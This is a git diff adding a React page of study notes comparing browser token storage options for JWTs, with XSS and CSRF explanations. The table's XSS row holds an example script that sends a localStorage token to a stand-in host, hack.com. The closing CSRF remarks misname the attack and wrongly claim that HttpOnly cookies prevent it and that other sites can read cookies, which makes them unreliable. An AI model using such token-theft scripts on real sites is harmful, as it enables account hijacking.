@@ -82,6 +82,31 @@ const styles = {
     gridTemplateColumns: "repeat(auto-fit,minmax(450px,1fr))",
     gap: "20px",
   },
+  
+  th: {
+    border: "1px solid #444",
+    padding: "14px",
+    textAlign: "left",
+  },
+
+  tdTitle: {
+    border: "1px solid #444",
+    padding: "14px",
+    background: "#222",
+    color: "#00ff90",
+    fontWeight: "bold",
+    verticalAlign: "top",
+    minWidth: "220px",
+  },
+
+  td: {
+    border: "1px solid #444",
+    padding: "14px",
+    background: "#1a1a1a",
+    color: "#fff",
+    verticalAlign: "top",
+    lineHeight: "1.8",
+  },
 };
 
 const JwtTokens = () => {
@@ -91,6 +116,708 @@ const JwtTokens = () => {
       <h3 style={styles.title}>
         🔐 JWT (Access Tokens + Refresh Tokens) + HTTPOnly Cookies (CSRF) + Redis (caching) + PostgreSQL(what is pool and how connect with pgsqlserver)
       </h3>
+      <section
+  style={{
+    padding: "20px",
+    textAlign: "left",
+    fontFamily: "sans-serif",
+  }}
+>
+
+  <h1
+    style={{
+      marginBottom: "20px",
+    }}
+  >
+    localStorage vs sessionStorage vs Cookies vs HttpOnly Cookies
+  </h1>
+
+  <div
+    style={{
+      overflowX: "auto",
+    }}
+  >
+
+    <table
+      style={{
+        width: "100%",
+        borderCollapse: "collapse",
+        minWidth: "1700px",
+      }}
+    >
+
+      <thead>
+
+        <tr
+          style={{
+            background: "#111",
+            color: "#00ff90",
+          }}
+        >
+          <th style={styles.th}>Feature</th>
+          <th style={styles.th}>localStorage</th>
+          <th style={styles.th}>sessionStorage</th>
+          <th style={styles.th}>Cookies</th>
+          <th style={styles.th}>HttpOnly Cookies</th>
+        </tr>
+
+      </thead>
+
+      <tbody>
+
+        <tr>
+          <td style={styles.tdTitle}>Where Stored</td>
+
+          <td style={styles.td}>
+            Browser Storage
+          </td>
+
+          <td style={styles.td}>
+            Browser Tab Storage
+          </td>
+
+          <td style={styles.td}>
+            Browser Cookie Storage
+          </td>
+
+          <td style={styles.td}>
+            Browser Cookie Storage
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Accessible By JavaScript</td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            localStorage.getItem()
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            sessionStorage.getItem()
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            document.cookie
+          </td>
+
+          <td style={styles.td}>
+            ✘ No
+            <br />
+            Browser blocks JS access
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Auto Sent To Backend</td>
+
+          <td style={styles.td}>
+            ✘ No
+            <br />
+            Must manually send in headers
+          </td>
+
+          <td style={styles.td}>
+            ✘ No
+            <br />
+            Must manually send in headers
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            Sent with every request
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            Sent automatically by browser
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Survives Refresh</td>
+
+          <td style={styles.td}>
+            ✔ Yes
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Survives Browser Close</td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            Until manually cleared
+          </td>
+
+          <td style={styles.td}>
+            ✘ No
+            <br />
+            Removed when tab closes
+          </td>
+
+          <td style={styles.td}>
+            Depends on expiry
+          </td>
+
+          <td style={styles.td}>
+            Depends on expiry
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Can Frontend Read JWT?</td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            Easy access using JS
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            Easy access using JS
+          </td>
+
+          <td style={styles.td}>
+            ✔ Yes
+            <br />
+            document.cookie
+          </td>
+
+          <td style={styles.td}>
+            ✘ No
+            <br />
+            Frontend cannot read token
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>XSS Attack Risk</td>
+
+          <td style={styles.td}>
+            ⚠ HIGH
+            <br />
+            Malicious JS can steal token
+            <br /><br />
+
+            Example:
+            <br />
+
+{`<script>
+fetch(
+ "https://hack.com?token=" +
+ localStorage.getItem("token")
+)
+</script>`}
+          </td>
+
+          <td style={styles.td}>
+            ⚠ HIGH
+            <br />
+            Same as localStorage
+          </td>
+
+          <td style={styles.td}>
+            ⚠ MEDIUM
+            <br />
+            JS can still read cookie
+            using document.cookie
+          </td>
+
+          <td style={styles.td}>
+            ✔ LOW
+            <br />
+            JS cannot access token
+            <br /><br />
+
+            HttpOnly blocks:
+            <br />
+            document.cookie
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>CSRF Attack Risk</td>
+
+          <td style={styles.td}>
+            ✔ LOW
+            <br />
+            Browser does not auto-send token
+          </td>
+
+          <td style={styles.td}>
+            ✔ LOW
+          </td>
+
+          <td style={styles.td}>
+            ⚠ HIGH
+            <br />
+            Browser auto-sends cookie
+          </td>
+
+          <td style={styles.td}>
+            ⚠ HIGH
+            <br />
+            Browser auto-sends cookie
+            <br /><br />
+
+            Protected using:
+            <br />
+            SameSite
+            <br />
+            CSRF Token
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Removed / Cleared</td>
+
+          <td style={styles.td}>
+{`localStorage.clear()
+
+localStorage.removeItem("token")`}
+          </td>
+
+          <td style={styles.td}>
+{`sessionStorage.clear()
+
+sessionStorage.removeItem("token")`}
+          </td>
+
+          <td style={styles.td}>
+{`document.cookie =
+"token=; expires=Thu,
+01 Jan 1970 00:00:00 UTC;"`}
+          </td>
+
+          <td style={styles.td}>
+            Cannot remove directly from JS
+            <br /><br />
+
+            Backend must send:
+            <br /><br />
+
+{`Set-Cookie:
+token=;
+HttpOnly;
+Expires=PastDate`}
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Storage Size</td>
+
+          <td style={styles.td}>
+            ~5MB
+          </td>
+
+          <td style={styles.td}>
+            ~5MB
+          </td>
+
+          <td style={styles.td}>
+            ~4KB
+          </td>
+
+          <td style={styles.td}>
+            ~4KB
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Persistence</td>
+
+          <td style={styles.td}>
+            Long term
+          </td>
+
+          <td style={styles.td}>
+            Per tab session
+          </td>
+
+          <td style={styles.td}>
+            Based on expiry
+          </td>
+
+          <td style={styles.td}>
+            Based on expiry
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Best Use</td>
+
+          <td style={styles.td}>
+            Theme
+            <br />
+            UI Preferences
+            <br />
+            Non-sensitive data
+          </td>
+
+          <td style={styles.td}>
+            Temporary form data
+            <br />
+            Per-tab state
+          </td>
+
+          <td style={styles.td}>
+            Small backend-readable data
+          </td>
+
+          <td style={styles.td}>
+            Authentication
+            <br />
+            Refresh Tokens
+            <br />
+            Secure Sessions
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>JWT Access Token</td>
+
+          <td style={styles.td}>
+            ⚠ Possible
+            <br />
+            But vulnerable to XSS
+          </td>
+
+          <td style={styles.td}>
+            ⚠ Possible
+          </td>
+
+          <td style={styles.td}>
+            ✔ Better
+          </td>
+
+          <td style={styles.td}>
+            ✔ Recommended
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Refresh Token</td>
+
+          <td style={styles.td}>
+            ✘ Dangerous
+          </td>
+
+          <td style={styles.td}>
+            ✘ Dangerous
+          </td>
+
+          <td style={styles.td}>
+            ⚠ Okay
+          </td>
+
+          <td style={styles.td}>
+            ✔ BEST CHOICE
+          </td>
+        </tr>
+
+        <tr>
+          <td style={styles.tdTitle}>Most Secure Setup</td>
+
+          <td style={styles.td}>
+            ✘ Not Recommended
+          </td>
+
+          <td style={styles.td}>
+            ✘ Not Recommended
+          </td>
+
+          <td style={styles.td}>
+            ✔ Better
+          </td>
+
+          <td style={styles.td}>
+            ✔ Access Token:
+            Memory
+            <br /><br />
+
+            ✔ Refresh Token:
+            HttpOnly Cookie
+          </td>
+        </tr>
+
+      </tbody>
+
+    </table>
+
+  </div>
+
+</section>
+<section
+  style={{
+    padding: "20px",
+    fontFamily: "sans-serif",
+    textAlign: "left",
+  }}
+>
+
+<div
+  style={{
+    display: "grid",
+    gridTemplateColumns: "1fr 1fr 1fr",
+    gap: "16px",
+  }}
+>
+
+{/* ====================================== */}
+{/* DEMO */}
+{/* ====================================== */}
+
+<div
+  style={{
+    background: "#111",
+    color: "#00ff90",
+    padding: "16px",
+    borderRadius: "10px",
+  }}
+>
+
+<h2>Demo</h2>
+
+<pre
+  style={{
+    whiteSpace: "pre-wrap",
+    lineHeight: "1.6",
+    fontSize: "13px",
+  }}
+>
+{`Note:- After login user assign jwt token so when user does any get,post, put, delete the backend need to verify the token before implementing it to DB.
+
+LOGIN RESPONSE
+---------------
+Set-Cookie:
+token=jwt123
+HttpOnly
+
+================================
+
+FRONTEND REQUEST
+----------------
+
+fetch("/posts", {
+  method: "POST",
+  credentials: "include"
+})
+
+================================
+ACTUAL REQUEST
+---------------
+POST /posts
+Cookie: token=jwt123
+
+================================
+
+BACKEND
+--------
+const token = req.cookies.token
+
+jwt.verify(token, SECRET)
+
+================================
+
+IMPORTANT
+----------
+✔ JS cannot READ token
+
+✘ document.cookie blocked
+
+✔ Browser CAN STILL attach cookie
+
+
+// HTTPOnly Cookies
+res.cookie("accessToken",accessToken,
+  {
+    httpOnly: true,
+    secure: true,
+    sameSite: "strict",
+  }
+);
+res.cookie("refreshToken",refreshToken,
+  {
+    httpOnly: true,
+    secure: true,
+    sameSite: "strict",
+  }
+);
+res.json({success: true, message:"Login success",});`}
+</pre>
+
+</div>
+
+{/* ====================================== */}
+{/* EXPLANATION */}
+{/* ====================================== */}
+
+<div
+  style={{
+    background: "#111",
+    color: "#00ff90",
+    padding: "16px",
+    borderRadius: "10px",
+  }}
+>
+
+<h2>Explanation</h2>
+
+<pre
+  style={{
+    whiteSpace: "pre-wrap",
+    lineHeight: "1.6",
+    fontSize: "13px",
+  }}
+>
+{`
+CONFUSION
+----------
+"If JS blocked, how request gets token?"
+
+================================
+
+ANSWER
+-------
+Browser itself manages cookies
+
+Frontend JS and Browser are different things
+
+================================
+
+JS
+---
+✘ Cannot read cookie
+
+Browser
+---------
+✔ Can store cookie
+✔ Can attach cookie
+✔ Can send cookie
+
+================================
+
+FLOW : js can't read but browser can read httponly cookies and attaches if same-site=true condition set at declaring cookie in backend
+-----
+
+1. Backend sets cookie
+2. Browser stores it
+3. User sends request
+4. Browser auto-adds:
+Cookie: token=xyz
+5. Backend verifies JWT
+
+================================
+
+IMPORTANT
+----------
+Frontend never manually attaches token
+
+Browser automatically handles cookie internally
+
+--> HTTP only cookies can't be read by frontend prevent csrf attack, can't be read by frontend using document.cookie but can be managed by browser neatly`}
+</pre>
+
+</div>
+
+{/* ====================================== */}
+{/* TRAPS */}
+{/* ====================================== */}
+
+<div
+  style={{
+    background: "#111",
+    color: "#00ff90",
+    padding: "16px",
+    borderRadius: "10px",
+  }}
+>
+
+<h2>Traps / Security</h2>
+
+<pre
+  style={{
+    whiteSpace: "pre-wrap",
+    lineHeight: "1.6",
+    fontSize: "13px",
+  }}
+>
+{`XSS ATTACK
+-----------
+<script>
+ localStorage.getItem("token")
+</script>
+✔ localStorage vulnerable
+================================
+
+HttpOnly
+----------
+<script>
+ document.cookie
+</script>
+✘ Blocked
+
+================================
+CSRF ISSUE
+------------
+
+Browser auto-sends cookie
+So malicious site may trigger authenticated request
+
+================================
+
+FIX
+----
+✔ SameSite=Strict
+✔ CSRF Token
+✔ Secure=true
+
+================================
+
+BEST PRACTICE
+--------------
+Access Token
+-------------
+✔ Memory
+
+Refresh Token
+--------------
+✔ HttpOnly Cookie
+
+
+--> CSRF- Cross Site Resource Forgery-- logged user of one website 
+          opens malicious website in other tab then the website also can 
+          access and read the cookies and pretend login as you. So preveht it by HTTP only cookies`}
+</pre>
+
+</div>
+
+</div>
+
+</section>
       {/* ================================================= */}
       {/* FLOW */}
       {/* ================================================= */}
